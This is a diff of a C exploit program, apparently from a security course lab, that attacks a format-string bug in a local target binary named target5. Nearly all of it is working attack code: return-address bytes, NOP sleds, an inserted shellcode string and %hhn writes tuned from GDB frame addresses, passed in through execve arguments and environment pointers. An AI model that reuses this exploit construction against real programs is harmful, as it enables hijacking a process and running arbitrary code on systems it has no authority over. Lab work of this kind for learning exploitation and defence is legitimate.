@@ -6,53 +6,79 @@
 
 #define TARGET "../targets/target5"
 
-const char * payload = "%08x%08x%08x%08x%08x%hhn"; 
+//const char * payload = "%08x%08x%08x%08x%08x%hhn"; 
 
 int main(void)
 {
   char *args[3];
-  char *env[5];
+  char *env[17];
 
   args[0] = TARGET;
 
   /* INFO FROM GDB:
    *    
    *        % info frame (of foo)
-   *             
-   *              Arglist at 0x2021fe90, args: 
-   *              arg=0x7fffffffedb5 "" Locals at 0x2021fe90, Previous frame's sp is 0x2021fea0
-   *              Saved registers:
-   *              rbp at 0x2021fe90, rip at 0x2021fe98
-   */
+   * 		Arglist at 0x2021fe60, args: arg=0x7fffffffeedd "\230\376! "
+   * 		Locals at 0x2021fe60, Previous frame's sp is 0x2021fe70
+   * 		Saved registers:
+   * 		rbp at 0x2021fe60, rip at 0x2021fe68
+   *
+   * 	    % x /x buf
+   * 	    	0x2021fa60
+   *
+   * 	    Address of shellcode = buf + 56 = 0x2021fa98
+   *
+   * 	    RA: 0x2021fe68, RA+1: 0x2021fe69, RA+2: 0z2021fe6a, RA+3: 0x2021fe6b
+   *
+   * 	    Acc. to lecture slide, we want <RA><DUMMY NOP><RA+1><DUMMY NOP><RA+2><DUMMY NOP><RA+3><SHELLCODE><%x%hhn...>
+   */	
 
-  char exploit[256] = {0};
-  strcat(exploit, "\x98\xfe\x21\x20");
-  exploit[4] = '\x00';
-  exploit[5] = '\x00';
-  exploit[6] = '\x00';
-  exploit[7] = '\x00';
-  memset(exploit+8, '\x90', 248);
 
-  //strcat(&exploit[60], "%x%x%x%x%x%x");
-  memcpy(exploit+60, payload, strlen(payload));
-  //strcat(&exploit[72], "\x98\xfe\x21\x20");
-  
-  env[0] = &exploit[4];
-  env[1] = &exploit[5];
-  env[2] = &exploit[6];
-  env[3] = &exploit[7];
-  env[4] = &exploit[8];
-  env[5] = NULL;
+	char exploit[256] = {0};
+	strcat(exploit, "\x68\xfe\x21\x20\x00\x00\x00\x00");
+	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
+	strcat(exploit, "\x69\xfe\x21\x20\x00\x00\x00\x00");
+	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
+	strcat(exploit, "\x6a\xfe\x21\x20\x00\x00\x00\x00");
+	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
+  	strcat(exploit, "\x6b\xfe\x21\x20\x00\x00\x00\x00");
 
-  //strcat(exploit, "\x98\xfe\x21\x20");
-  //  exploit[0] = '\x98';
-  
-  
+  	strcat(exploit, shellcode);
+
+	// snprintf already used 41 bytes	
+
+	strcat(exploit, "%111d%hhn");
+	strcat(exploit, "%129d%hhn");
+	strcat(exploit, "%9d%hhn");
+	strcat(exploit, "%254d%hhn");
+	
+	int len = strlen(exploit);
+	int j;
+	for (j = 0; j < 256 - len; j++){
+		exploit[len+j] = '\x90';
+	}
 
   args[1] = exploit;
-  // args[1] = "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x";
   args[2] = NULL;
-  //  env[0] = NULL;
+
+  env[0] = &exploit[4];
+    env[1] = &exploit[5];
+    env[2] = &exploit[6];
+    env[3] = &exploit[7];
+    env[4] = &exploit[20];
+    env[5] = &exploit[21];
+    env[6] = &exploit[22];
+    env[7] = &exploit[23];
+    env[8] = &exploit[36];
+    env[9] = &exploit[37];
+    env[10] = &exploit[38];
+    env[11] = &exploit[39];
+    env[12] = &exploit[52];
+    env[13] = &exploit[53];
+    env[14] = &exploit[54];
+    env[15] = &exploit[55];
+    env[16] = NULL;
+
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
